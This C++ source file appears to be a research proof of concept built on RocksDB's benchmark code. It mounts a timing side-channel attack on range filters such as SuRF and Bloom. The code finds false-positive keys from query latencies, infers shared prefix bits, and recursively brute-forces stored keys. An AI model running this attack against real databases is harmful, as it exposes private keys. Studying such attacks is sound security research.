// Copyright (c) 2011-present, Facebook, Inc.  All rights reserved.
//  This source code is licensed under both the GPLv2 (found in the
//  COPYING file in the root directory) and Apache 2.0 License
//  (found in the LICENSE.Apache file in the root directory).

#include <endian.h>
#include <errno.h>
#include <time.h>

#include <atomic>
#include <cinttypes>
#include <climits>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <random>
#include <string>
#include <thread>
#include <vector>

#include "port/port.h"
#include "rocksdb/db.h"
#include "rocksdb/filter_policy.h"
#include "rocksdb/options.h"
#include "rocksdb/slice.h"
#include "rocksdb/table.h"
#include "util/mutexlock.h"

/* Comma-seperated list of operations
 */
static const char* FLAGS_benchmarks =
    "fillrandom,"
    "point_query,"
    "range_query,";

// # of Key Inserted.
static uint64_t FLAGS_num = 1000000;

// Value Size
static int FLAGS_value_size = 1000;

// Prefix Bits
static int FLAGS_prefix_bit = 32;

// If true, do not destroy existing db.
static bool FLAGS_use_existing_db = false;

// Use the db with the following name.
static const char* FLAGS_db = nullptr;

// Use Key Distribution From Path
static const char* FLAGS_key_path = nullptr;

// Key Distribution
static const char* FLAGS_distribution = nullptr;

// Write Buffer Size
static uint64_t FLAGS_write_buffer_size = 64 * 1048576;

// Block Size
static uint64_t FLAGS_block_size = -1;

// Max Open Files
static uint64_t FLAGS_open_files = -1;

// Level-1 Capacity
static uint64_t FLAGS_max_bytes_for_level_base = 256 * 1048576;

// Data Block Size
static uint64_t FLAGS_target_file_size_base = 64 * 1048576;

// Key Range
static uint64_t FLAGS_key_range = 1000000000000000000;

// If true, find fpk during scan
static uint64_t FLAGS_find_fpk = false;

// If true, use compression.
static bool FLAGS_compression = false;

// Use Direct IO
static bool FLAGS_direct_io = false;

// Filter Type
static const char* FLAGS_filter_type = nullptr;

// # of Threads
static int FLAGS_threads = 1;

// Threshold Min (Response Time)
static uint64_t FLAGS_threshold_min = 12;

// Threshold Max (Response Time)
static uint64_t FLAGS_threshold_max = 20;

// Threshold for Identify Prefix Avg. Time Error
static uint64_t FLAGS_threshold_ip = 4;

// Minimum Prefix Bit to Attack
static uint64_t FLAGS_threshold_prefix_bit_min = 36;

// Maximum Prefix Bit to Attack
static uint64_t FLAGS_threshold_prefix_bit_max = 54;

namespace rocksdb {

namespace {
rocksdb::Env* g_env = nullptr;

class Stats {
 private:
  double start_;
  double finish_;
  double seconds_;
  uint64_t done_;
  uint64_t done_ip_;
  uint64_t found_;
  uint64_t found_fpk_;

 public:
  Stats() { Start(); }

  void Start() {
    done_ = done_ip_ = found_ = found_fpk_ = 0;
    start_ = finish_ = g_env->NowMicros();
  }

  void Stop() {
    finish_ = g_env->NowMicros();
    seconds_ = (finish_ - start_) * 1e-6;
  }

  void FinishedSingleOp() { done_++; }

  void FinishedIp() { done_ip_++; }

  void FoundFpkOp() { found_fpk_++; }

  void FoundOp() { found_++; }

  void Report() {
    // Pretend at least one op was done in case we are running a benchmark
    // that does not call FinishedSingleOp().
    if (done_ < 1) done_ = 1;

    uint64_t seconds = (uint64_t)seconds_;

    printf("\n======================================\n");
    printf("Report\n");
    printf("Total Time: %ld hour %ld min %ld sec, Find Keys: %ld\n",
           (seconds / 3600), (seconds % 3600) / 60, seconds % 60, found_);
    printf("Key Extraction Rate: %.3lfmin/key\n", seconds_ / found_);
    printf("# of Query (Total: %ld)\n", done_);
    printf("(1) Random Key: %ld, False Positive: %ld (Ratio: %.3lf)\n",
           FLAGS_num, found_fpk_, (double)found_fpk_ / (double)FLAGS_num);
    printf("(2) Identify Prefix: %ld\n", done_ip_);
    printf("(3) Extract Key: %ld\n", found_);

    std::fflush(stdout);
  }
};

// State shared by all concurrent executions of the same benchmark.
struct SharedState {
  port::Mutex mu;
  port::CondVar cv;
  int total;

  // Each thread goes through the following states:
  //    (1) initializing
  //    (2) waiting for others to be initialized
  //    (3) running
  //    (4) done

  int num_initialized;
  int num_done;
  bool start;

  SharedState(int total_)
      : cv(&mu), total(total_), num_initialized(0), num_done(0), start(false) {}
};

// Per-thread state for concurrent executions of the same benchmark.
struct ThreadState {
  int tid;  // 0..n-1 when running in n threads
  SharedState* shared;

  ThreadState(int index) : tid(index), shared() {}

 private:
  ThreadState(const ThreadState&);
  ThreadState& operator=(const ThreadState&);
};
}  // namespace

class Benchmark {
 private:
  rocksdb::DB* db;
  uint64_t num_;
  int value_size_;
  int total_thread_count_;
  std::vector<uint64_t> fpk_list_;
  std::vector<uint64_t> real_list_;
  Stats stat;

 public:
  Benchmark()
      : db(nullptr),
        num_(FLAGS_num),
        value_size_(FLAGS_value_size),
        total_thread_count_(0) {
    std::vector<std::string> files;
    g_env->GetChildren(FLAGS_db, &files);
  }

  ~Benchmark() { delete db; }
  // assume compression ratio = 0.5
  void setValueBuffer(char* value_buf, int size, std::mt19937_64& e,
                      std::uniform_int_distribution<unsigned long long>& dist) {
    memset(value_buf, 0, size);
    int pos = size / 2;
    while (pos < size) {
      uint64_t num = dist(e);
      char* num_bytes = reinterpret_cast<char*>(&num);
      memcpy(value_buf + pos, num_bytes, 8);
      pos += 8;
    }
  }

  void Open() {
    rocksdb::Options options;
    rocksdb::BlockBasedTableOptions table_options;
    const char* filter_type = FLAGS_filter_type;
    rocksdb::Slice filter = filter_type;

    if (filter == rocksdb::Slice("bloom"))
      table_options.filter_policy.reset(
          rocksdb::NewBloomFilterPolicy(14, false));
    else if (filter == rocksdb::Slice("surf_hash"))
      table_options.filter_policy.reset(
          rocksdb::NewSuRFPolicy(1, 4, true, 16, false));
    else if (filter == rocksdb::Slice("surf_real"))
      table_options.filter_policy.reset(
          rocksdb::NewSuRFPolicy(2, 4, true, 16, false));
    else if (filter == rocksdb::Slice("surf"))
      table_options.filter_policy.reset(
          rocksdb::NewSuRFPolicy(0, 0, true, 16, false));

    options.compression = FLAGS_compression
                              ? rocksdb::CompressionType::kSnappyCompression
                              : rocksdb::CompressionType::kNoCompression;

    table_options.block_cache = rocksdb::NewLRUCache(1000 * 1048576);
    table_options.pin_l0_filter_and_index_blocks_in_cache = true;
    table_options.cache_index_and_filter_blocks = true;

    options.table_factory.reset(
        rocksdb::NewBlockBasedTableFactory(table_options));

    options.max_open_files = FLAGS_open_files;

    options.write_buffer_size = FLAGS_write_buffer_size;
    options.max_bytes_for_level_base = FLAGS_max_bytes_for_level_base;
    options.target_file_size_base = FLAGS_target_file_size_base;

    options.use_direct_reads = FLAGS_direct_io;

    options.statistics = rocksdb::CreateDBStatistics();

    options.create_if_missing = !FLAGS_use_existing_db;
    options.error_if_exists = false;

    // options->prefix_extractor = nullptr;
    // options->disable_auto_compactions = false;
    rocksdb::Status status = rocksdb::DB::Open(options, FLAGS_db, &db);
    if (!status.ok()) {
      std::cout << status.ToString().c_str() << "\n";
      std::exit(1);
    }
  }

  void close() { delete db; }

  // Insert Key into Specified db path
  void DoWrite(ThreadState* thread) {
    rocksdb::Status status;
    char value_buf[FLAGS_value_size];
    std::mt19937_64 e(2017);
    std::uniform_int_distribution<unsigned long long> dist(0, ULLONG_MAX);

    assert(FLAGS_key_path != nullptr);

    printf("num: %ld\n", FLAGS_num);

    std::cout << "loading timestamp keys\n";
    printf("%s\n", FLAGS_key_path);
    std::ifstream keyFile(FLAGS_key_path);
    std::vector<uint64_t> keys;

    uint64_t key = 0;
    std::cout << "Reading Key File\n";
    for (uint64_t i = 0; i < FLAGS_num; i++) {
      keyFile >> key;
      keys.push_back(key);
      // printf("%lx\n", key);
    }

    std::cout << "inserting keys\n";
    for (uint64_t i = 0; i < FLAGS_num; i++) {
      key = keys[i];
      key = htobe64(key);
      rocksdb::Slice s_key(reinterpret_cast<const char*>(&key), sizeof(key));
      setValueBuffer(value_buf, FLAGS_value_size, e, dist);
      rocksdb::Slice s_value(value_buf, FLAGS_value_size);

      status = db->Put(rocksdb::WriteOptions(), s_key, s_value);
      if (!status.ok()) {
        std::cout << status.ToString().c_str() << "\n";
        assert(false);
      }

      if (i % (FLAGS_num / 100) == 0)
        std::cout << i << "/" << FLAGS_num << " ["
                  << ((i + 0.0) / (FLAGS_num + 0.0) * 100.) << "]\n";
    }
    // std::cout << "compacting\n";
    // rocksdb::CompactRangeOptions compact_range_options;
    //(*db)->CompactRange(compact_range_options, NULL, NULL);
  }

  void PrintHeader() {
    printf("DB Path: %40s\n", FLAGS_db);
    printf("Key Path: %39s\n", FLAGS_key_path);
    printf("Filter Type: %36s\n", FLAGS_filter_type);
    printf("# of Key: %39ld\n", FLAGS_num);
    printf("Value Size: %37d\n", FLAGS_value_size);
    printf("Compression: %36d\n", FLAGS_compression);
    printf("Direct I/O: %37d\n", FLAGS_direct_io);
    printf("Threshold (1) FindFPK (min, max): (%ldus, %ldus)\n",
           FLAGS_threshold_min, FLAGS_threshold_max);
    printf(
        "Threshold (2) IdentifyPrefix Error: %ldus, Prefix Bit (min, max): "
        "(%ldbit, "
        "%ldbit)\n",
        FLAGS_threshold_ip, FLAGS_threshold_prefix_bit_min,
        FLAGS_threshold_prefix_bit_max);
    printf("=============== benchmarks: %s ================\n",
           FLAGS_benchmarks);

    std::fflush(stdout);
  }

  void Run() {
    Open();

    stat.Start();

    std::ifstream keyFile(FLAGS_key_path);

    uint64_t key;
    for (uint64_t i = 0; i < FLAGS_num; i++) {
      keyFile >> key;
      real_list_.push_back(key);
    }

    PrintHeader();

    const char* benchmarks = FLAGS_benchmarks;
    while (benchmarks != nullptr) {
      const char* sep = strchr(benchmarks, ',');
      Slice name;
      if (sep == nullptr) {
        name = benchmarks;
        benchmarks = nullptr;
      } else {
        name = Slice(benchmarks, sep - benchmarks);
        benchmarks = sep + 1;
      }

      num_ = FLAGS_num;
      value_size_ = FLAGS_value_size;

      void (Benchmark::*method)(ThreadState*) = nullptr;
      int num_threads = FLAGS_threads;

      if (name == Slice("fillrandom")) {
        method = &Benchmark::DoWrite;
      } else if (name == Slice("scan")) {
        method = &Benchmark::DoScan;
      } else if (name == Slice("extract")) {
        method = &Benchmark::DoExtract;
      } else if (name == Slice("attack")) {
        method = &Benchmark::DoAttack;
      }

      if (method != nullptr) {
        RunBenchmark(num_threads, name, method);
      }
    }
    stat.Stop();
    stat.Report();
  }

  struct ThreadArg {
    Benchmark* bm;
    SharedState* shared;
    ThreadState* thread;
    void (Benchmark::*method)(ThreadState*);
  };

  static void ThreadBody(void* v) {
    ThreadArg* arg = reinterpret_cast<ThreadArg*>(v);
    SharedState* shared = arg->shared;
    ThreadState* thread = arg->thread;
    {
      MutexLock l(&shared->mu);
      shared->num_initialized++;
      if (shared->num_initialized >= shared->total) {
        shared->cv.SignalAll();
      }
      while (!shared->start) {
        shared->cv.Wait();
      }
    }

    (arg->bm->*(arg->method))(thread);

    {
      MutexLock l(&shared->mu);
      shared->num_done++;
      if (shared->num_done >= shared->total) {
        shared->cv.SignalAll();
      }
    }
  }

  void RunBenchmark(int n, Slice name,
                    void (Benchmark::*method)(ThreadState*)) {
    SharedState shared(n);

    ThreadArg* arg = new ThreadArg[n];
    for (int i = 0; i < n; i++) {
      arg[i].bm = this;
      arg[i].method = method;
      arg[i].shared = &shared;
      // ++total_thread_count_;
      // Seed the thread's random state deterministically based upon thread
      // creation across all benchmarks. This ensures that the seeds are unique
      // but reproducible when rerunning the same set of benchmarks.
      arg[i].thread = new ThreadState(i);
      arg[i].thread->shared = &shared;
      g_env->StartThread(ThreadBody, &arg[i]);
    }

    shared.mu.Lock();
    while (shared.num_initialized < n) {
      shared.cv.Wait();
    }

    shared.start = true;
    shared.cv.SignalAll();
    while (shared.num_done < n) {
      shared.cv.Wait();
    }
    shared.mu.Unlock();

    for (int i = 0; i < n; i++) {
      delete arg[i].thread;
    }
    delete[] arg;
  }

  uint64_t getFlagLow(int bits) {
    uint64_t flag = 0;
    bits = 64 - bits;
    while (bits--) {
      flag |= (uint64_t)1 << bits;
    }
    return flag;
  }

  uint64_t getFlag(int bits) {
    uint64_t flag = 0;
    while (bits--) {
      flag |= (uint64_t)1 << (63 - bits);
    }
    return flag;
  }

  uint64_t generateFPK(uint64_t key, int bits) {
    uint64_t flag = getFlag(bits);
    return key & flag;
  }

  void DoScan(ThreadState* thread) {
    std::ifstream keyFile(FLAGS_key_path);
    std::vector<uint64_t> keys;
    uint64_t key = 0;

    std::mt19937_64 e(2017);
    std::uniform_int_distribution<unsigned long long> dist(0, FLAGS_key_range);

    const char* distribution_c = FLAGS_distribution;
    rocksdb::Slice distribution = distribution_c;

    if (distribution == rocksdb::Slice("random")) {
      for (uint64_t i = 0; i < FLAGS_num; i++) {
        uint64_t r = dist(e);
        keys.push_back(r);
      }
    } else if (distribution == rocksdb::Slice("real")) {
      for (uint64_t i = 0; i < FLAGS_num; i++) {
        keyFile >> key;
        keys.push_back(key);
      }
    } else if (distribution == rocksdb::Slice("prefix")) {
      for (uint64_t i = 0; i < FLAGS_num; i++) {
        keyFile >> key;
        keys.push_back(generateFPK(key, FLAGS_prefix_bit));
      }
    }

    if (FLAGS_find_fpk) {
      printf("Attack Start!!\n");
      printf(
          "(1)FindFPK(): Scanning %ld Key Entries with Threshold (%ldus, "
          "%ldus)\n",
          FLAGS_num, FLAGS_threshold_min, FLAGS_threshold_max);
    }
    for (uint64_t i = 0; i < FLAGS_num; i++) {
      key = htobe64(keys[i]);
      uint64_t start, end;

      rocksdb::Slice s_key(reinterpret_cast<const char*>(&key), sizeof(key));
      std::string s_value;
      // uint64_t value;

      start = g_env->NowMicros();
      rocksdb::Status status = db->Get(rocksdb::ReadOptions(), s_key, &s_value);
      stat.FinishedSingleOp();
      end = g_env->NowMicros();

      uint64_t time = end - start;
      if (FLAGS_find_fpk && time >= FLAGS_threshold_min &&
          time <= FLAGS_threshold_max) {
        fpk_list_.push_back(keys[i]);
        stat.FoundFpkOp();
      }
      if (false)
        printf("Query %ld %ld (Key:    %lx) (%s)\n", i, end - start, keys[i],
               status.ToString().c_str());
      if (status.ok()) {
        assert(s_value.size() >= sizeof(uint64_t));
        // value = *reinterpret_cast<const uint64_t*>(s_value.data());
      }
    }
  }

  void DoAttack(ThreadState* thread) {
    uint64_t key = 0;
    uint64_t start, end;
    uint64_t cnt = 0;

    printf("%ld False Positive Key Found\n", fpk_list_.size());

    for (auto fpk : fpk_list_) {
      double avg;
      uint64_t shared_prefix_bit = (uint64_t)IdentifyPrefix(fpk, avg);
      if (shared_prefix_bit >= FLAGS_threshold_prefix_bit_min &&
          shared_prefix_bit <= FLAGS_threshold_prefix_bit_max) {
        for (auto k : real_list_) {
          if (generateFPK(fpk, shared_prefix_bit) ==
              generateFPK(k, shared_prefix_bit)) {
            cnt++;
            break;
          }
        }
      }
    }
    printf("%ld Real Key Can Be Found\n", cnt);

    cnt = 0;
    for (uint64_t j = 0; j < fpk_list_.size(); j++) {
      std::fflush(stdout);
      key = fpk_list_[j];
      double avg;
      uint64_t shared_prefix_bit = (uint64_t)IdentifyPrefix(key, avg);
      if (shared_prefix_bit >= FLAGS_threshold_prefix_bit_min &&
          shared_prefix_bit <= FLAGS_threshold_prefix_bit_max) {
        uint64_t ans = 0;
        for (auto k : real_list_) {
          if (generateFPK(k, shared_prefix_bit) ==
              generateFPK(key, shared_prefix_bit)) {
            ans = k;
            break;
          }
        }
        if (ans == 0) continue;
        {
          uint64_t tmp = htobe64(ans);
          rocksdb::Slice s_key(reinterpret_cast<const char*>(&tmp),
                               sizeof(key));
          std::string s_value;
          start = g_env->NowMicros();
          rocksdb::Status status =
              db->Get(rocksdb::ReadOptions(), s_key, &s_value);
          stat.FinishedSingleOp();
          end = g_env->NowMicros();
          printf("\n");
          printf(
              "(2)IdentifyPrefix(): False Positive Key: %lx, Shared Prefix "
              "Bits: %ld, avg: %lfus\n",
              key, shared_prefix_bit, avg);
          printf("Answer: Get %lx, Time %ldus\n", ans,
                 (end -
                  start));  // not available by attacker, but for verification
        }

        printf("(3)ExtractKey()\n");
        start = g_env->NowMicros();
        uint64_t real_key = DoExtractFPK(key, shared_prefix_bit, avg);
        end = g_env->NowMicros();
        if (real_key == ans) {
          stat.FoundOp();
          cnt++;
          printf("SUCCESS! Key: %lx, Total Time during ExtractKey(): %ldms\n",
                 real_key, (end - start) / 1000);
        }
      }
    }
  }

  int IdentifyPrefix(uint64_t key, double& avg_fpk) {
    rocksdb::Status status;
    std::string s_value;
    uint64_t start, end;
    int sum = 0;
    int ret = 0;
    for (int i = 64; i >= 0; i--) {
      uint64_t tmp = htobe64(generateFPK(key, i));

      rocksdb::Slice s_key(reinterpret_cast<const char*>(&tmp), sizeof(key));
      start = g_env->NowMicros();
      status = db->Get(rocksdb::ReadOptions(), s_key, &s_value);
      stat.FinishedSingleOp();
      stat.FinishedIp();
      end = g_env->NowMicros();
      // printf("Query %d %ld (Key:    %lx) (%s)\n", i, end - start, key,
      //        status.ToString().c_str());
      if (i < 64 && !ret) {
        double time = (double)(end - start);
        double avg = (double)sum / (double)(64 - i);
        if (ret == 0 && i < 60 && time < avg &&
            avg - time > FLAGS_threshold_ip) {
          ret = i + 1;
          avg_fpk = avg;
        }
        sum += time;
      }
    }
    return ret;
  }

  uint64_t DoExtractFPK(uint64_t key, int prefix_bit, double avg) {
    uint64_t start, end;
    std::string s_value;
    rocksdb::Status status;

    if (prefix_bit > 64) return 0;
    uint64_t flag = getFlagLow(prefix_bit);
    uint64_t ans = 0;
    uint64_t step = (uint64_t)1 << (((64 - prefix_bit) / 4) * 4);
    key = generateFPK(key, prefix_bit);

    for (uint64_t k = 0; k < 16; k++) {
      uint64_t tmp = htobe64(key);
      rocksdb::Slice s_key(reinterpret_cast<const char*>(&tmp), sizeof(key));

      start = g_env->NowMicros();
      status = db->Get(rocksdb::ReadOptions(), s_key, &s_value);
      stat.FinishedSingleOp();
      end = g_env->NowMicros();

      uint64_t time = end - start;

      // printf("Extraction %lx, Step: %lx, Time %ldus\n", key, step, time);

      if (status.ok()) {
        return key;
      }

      if (time >= (uint64_t)avg - 2) {
        start = g_env->NowMicros();
        uint64_t ret = DoExtractFPK(key, prefix_bit + 4, avg);
        end = g_env->NowMicros();
        uint64_t latency = end - start;
        if (prefix_bit <= 44)
          printf(
              "Key Extraction (False Positve Key: %lx) %d Prefix Bit "
              "(%ldms)... \n",
              key, prefix_bit + 4, (latency / 1000));
        if (ret) return ret;
      }

      key += step;
    }
    return 0;
  }

  void DoExtract(ThreadState* thread) {
    std::ifstream keyFile(FLAGS_key_path);
    std::vector<uint64_t> keys;
    uint64_t key = 0;
    uint64_t start, end;
    uint64_t flag = getFlagLow(FLAGS_prefix_bit);
    printf("flag: %lx\n", flag);

    std::mt19937_64 e(2017);
    std::uniform_int_distribution<unsigned long long> dist(0, FLAGS_key_range);
    std::string s_value;
    rocksdb::Status status;
    const char* distribution_c = FLAGS_distribution;

    for (int j = 0; j < 100; j++) {
      keyFile >> key;
      for (int i = 64; i >= 0; i--) {
        uint64_t tmp = htobe64(generateFPK(key, i));

        rocksdb::Slice s_key(reinterpret_cast<const char*>(&tmp), sizeof(key));
        start = g_env->NowMicros();
        status = db->Get(rocksdb::ReadOptions(), s_key, &s_value);
        end = g_env->NowMicros();
        printf("Query %d %ld (Key:    %lx) (%s)\n", i, end - start, key,
               status.ToString().c_str());
      }
    }

    key = generateFPK(key, FLAGS_prefix_bit);

    flag = 0;
    for (uint64_t k = 0; k <= flag; k++) {
      uint64_t tmp = htobe64(key);
      rocksdb::Slice s_key(reinterpret_cast<const char*>(&tmp), sizeof(key));
      // uint64_t value;

      start = g_env->NowMicros();
      status = db->Get(rocksdb::ReadOptions(), s_key, &s_value);
      end = g_env->NowMicros();
      printf("Query %ld %ld (Key:    %lx) (%s)\n", k, end - start, key,
             status.ToString().c_str());

      if (status.ok()) {
        assert(s_value.size() >= sizeof(uint64_t));
        // value = *reinterpret_cast<const uint64_t*>(s_value.data());
        printf("Query %ld %ld (Key:    %lx) (%s)\n", k, end - start, key,
               status.ToString().c_str());
        break;
      }
      key++;
    }
  }

  // void benchOpenRangeQuery(rocksdb::DB* db, rocksdb::Options* options,
  //                          uint64_t key_range, uint64_t query_count,
  //                          uint64_t scan_length) {
  //   // std::random_device rd;
  //   // std::mt19937_64 e(rd());
  //   std::mt19937_64 e(2017);
  //   std::uniform_int_distribution<unsigned long long> dist(0, key_range);

  //   std::vector<uint64_t> query_keys;

  //   for (uint64_t i = 0; i < query_count; i++) {
  //     uint64_t r = dist(e);
  //     query_keys.push_back(r);
  //   }

  //   struct timespec ts_start;
  //   struct timespec ts_end;
  //   uint64_t elapsed;

  //   printf("open range query\n");
  //   rocksdb::Iterator* it = db->NewIterator(rocksdb::ReadOptions());

  //   clock_gettime(CLOCK_MONOTONIC, &ts_start);

  //   for (uint64_t i = 0; i < query_count; i++) {
  //     uint64_t key = query_keys[i];
  //     key = htobe64(key);
  //     rocksdb::Slice s_key(reinterpret_cast<const char*>(&key), sizeof(key));

  //     std::string s_value;
  //     uint64_t value;

  //     uint64_t j = 0;
  //     for (it->Seek(s_key); it->Valid() && j < scan_length; it->Next(), j++)
  //     {
  //       uint64_t found_key =
  //           *reinterpret_cast<const uint64_t*>(it->key().data());
  //       assert(it->value().size() >= sizeof(uint64_t));
  //       value = *reinterpret_cast<const uint64_t*>(it->value().data());
  //       (void)value;
  //       break;
  //     }
  //   }

  //   clock_gettime(CLOCK_MONOTONIC, &ts_end);
  //   elapsed = static_cast<uint64_t>(ts_end.tv_sec) * 1000000000UL +
  //             static_cast<uint64_t>(ts_end.tv_nsec) -
  //             static_cast<uint64_t>(ts_start.tv_sec) * 1000000000UL +
  //             static_cast<uint64_t>(ts_start.tv_nsec);

  //   // std::cout << "elapsed:    " << (static_cast<double>(elapsed) /
  //   // 1000000000.)
  //   // << "\n";
  //   std::cout << "throughput: "
  //             << (static_cast<double>(query_count) /
  //                 (static_cast<double>(elapsed) / 1000000000.))
  //             << "\n";

  //   std::string stats = options->statistics->ToString();
  //   size_t pos = stats.find("rocksdb.db.seek.micros statistics Percentiles");
  //   size_t end_pos =
  //       stats.find("rocksdb.db.write.stall statistics Percentiles");
  //   std::string latencies = stats.substr(pos, (end_pos - pos));
  //   std::cout << latencies;

  //   delete it;
  // }

  // void benchClosedRangeQuery(rocksdb::DB* db, rocksdb::Options* options,
  //                            uint64_t key_range, uint64_t query_count,
  //                            uint64_t range_size) {
  //   // std::random_device rd;
  //   // std::mt19937_64 e(rd());
  //   std::mt19937_64 e(2017);
  //   std::uniform_int_distribution<unsigned long long> dist(0, key_range);

  //   std::vector<uint64_t> query_keys;

  //   for (uint64_t i = 0; i < query_count; i++) {
  //     uint64_t r = dist(e);
  //     query_keys.push_back(r);
  //   }

  //   struct timespec ts_start;
  //   struct timespec ts_end;
  //   uint64_t elapsed;

  //   printf("closed range query\n");

  //   clock_gettime(CLOCK_MONOTONIC, &ts_start);

  //   for (uint64_t i = 0; i < query_count; i++) {
  //     uint64_t key = query_keys[i];
  //     uint64_t upper_key = key + range_size;
  //     key = htobe64(key);
  //     rocksdb::Slice s_key(reinterpret_cast<const char*>(&key), sizeof(key));
  //     upper_key = htobe64(upper_key);
  //     rocksdb::Slice s_upper_key(reinterpret_cast<const char*>(&upper_key),
  //                                sizeof(upper_key));

  //     std::string s_value;
  //     uint64_t value;

  //     rocksdb::ReadOptions read_options = rocksdb::ReadOptions();
  //     read_options.iterate_upper_bound = &s_upper_key;
  //     rocksdb::Iterator* it = db->NewIterator(read_options);

  //     uint64_t j = 0;
  //     for (it->Seek(s_key); it->Valid(); it->Next(), j++) {
  //       uint64_t found_key =
  //           *reinterpret_cast<const uint64_t*>(it->key().data());
  //       assert(it->value().size() >= sizeof(uint64_t));
  //       value = *reinterpret_cast<const uint64_t*>(it->value().data());
  //       (void)value;
  //       break;
  //     }

  //     delete it;
  //   }

  //   clock_gettime(CLOCK_MONOTONIC, &ts_end);
  //   elapsed = static_cast<uint64_t>(ts_end.tv_sec) * 1000000000UL +
  //             static_cast<uint64_t>(ts_end.tv_nsec) -
  //             static_cast<uint64_t>(ts_start.tv_sec) * 1000000000UL +
  //             static_cast<uint64_t>(ts_start.tv_nsec);

  //   // std::cout << "elapsed:    " << (static_cast<double>(elapsed) /
  //   // 1000000000.)
  //   // << "\n";
  //   std::cout << "throughput: "
  //             << (static_cast<double>(query_count) /
  //                 (static_cast<double>(elapsed) / 1000000000.))
  //             << "\n";

  //   std::string stats = options->statistics->ToString();
  //   size_t pos = stats.find("rocksdb.db.seek.micros statistics Percentiles");
  //   size_t end_pos =
  //       stats.find("rocksdb.db.write.stall statistics Percentiles");
  //   std::string latencies = stats.substr(pos, (end_pos - pos));
  //   std::cout << latencies;
  // }
};

}  // namespace rocksdb

int main(int argc, const char* argv[]) {
  FLAGS_open_files = rocksdb::Options().max_open_files;

  for (int i = 1; i < argc; i++) {
    double d;
    uint64_t n;
    char junk;
    if (rocksdb::Slice(argv[i]).starts_with("--benchmarks=")) {
      FLAGS_benchmarks = argv[i] + strlen("--benchmarks=");
    } else if (sscanf(argv[i], "--num=%ld%c", &n, &junk) == 1) {
      FLAGS_num = n;
    } else if (sscanf(argv[i], "--value_size=%ld%c", &n, &junk) == 1) {
      FLAGS_value_size = n;
    } else if (strncmp(argv[i], "--filter_type=", 14) == 0) {
      FLAGS_filter_type = argv[i] + 14;
    } else if (sscanf(argv[i], "--compression=%ld%c", &n, &junk) == 1) {
      FLAGS_compression = n;
    } else if (sscanf(argv[i], "--direct=%ld%c", &n, &junk) == 1) {
      FLAGS_direct_io = n;
    } else if (sscanf(argv[i], "--write_buffer_size=%ld%c", &n, &junk) == 1) {
      FLAGS_write_buffer_size = n;
    } else if (sscanf(argv[i], "--prefix_bit=%ld%c", &n, &junk) == 1) {
      FLAGS_prefix_bit = n;
    } else if (sscanf(argv[i], "--th_findfpk_min=%ld%c", &n, &junk) == 1) {
      FLAGS_threshold_min = n;
    } else if (sscanf(argv[i], "--th_findfpk_max=%ld%c", &n, &junk) == 1) {
      FLAGS_threshold_max = n;
    } else if (sscanf(argv[i], "--th_ip_error=%ld%c", &n, &junk) == 1) {
      FLAGS_threshold_ip = n;
    } else if (sscanf(argv[i], "--th_prefix_bit_min=%ld%c", &n, &junk) == 1) {
      FLAGS_threshold_prefix_bit_min = n;
    } else if (sscanf(argv[i], "--th_prefix_bit_max=%ld%c", &n, &junk) == 1) {
      FLAGS_threshold_prefix_bit_max = n;
    } else if (sscanf(argv[i], "--findfpk=%ld%c", &n, &junk) == 1) {
      FLAGS_find_fpk = n;
    } else if (strncmp(argv[i], "--db=", 5) == 0) {
      FLAGS_db = argv[i] + 5;
    } else if (strncmp(argv[i], "--key_path=", 11) == 0) {
      FLAGS_key_path = argv[i] + 11;
    } else if (strncmp(argv[i], "--distribution=", 15) == 0) {
      FLAGS_distribution = argv[i] + 15;
    } else {
      fprintf(stderr, "Invalid flag '%s'\n", argv[i]);
      exit(1);
    }
  }

  if (FLAGS_db == nullptr) {
    fprintf(stderr, "Invalid db path\n");
    exit(1);
  }

  rocksdb::g_env = rocksdb::Env::Default();

  //=========================================================================

  rocksdb::Benchmark benchmark;
  benchmark.Run();
  return 0;
}
